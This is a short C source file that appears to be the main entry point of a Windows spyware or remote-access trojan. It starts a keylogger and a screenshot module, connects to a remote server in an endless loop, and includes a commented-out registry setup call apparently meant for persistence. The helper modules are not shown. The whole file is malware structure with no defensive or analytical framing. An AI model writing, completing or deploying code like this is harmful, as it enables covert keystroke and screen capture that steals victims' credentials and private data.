#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include "client.h"
#include "keylogger.h"
#include "screenshot.h"
#include "reg.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	srand(time(NULL));
	
	/* To setup in reg
	if(reg_Setup())
	{
		return 0;
	}*/

	screenshot_Init();
	keylogger_Start();
	client_Prepare();

	while(1)
	{
		client_Connect();
		client_ConnectionHandle();
		CLIENT_SLEEP_BETWEEN_FUNC();
	}

	return 0;
}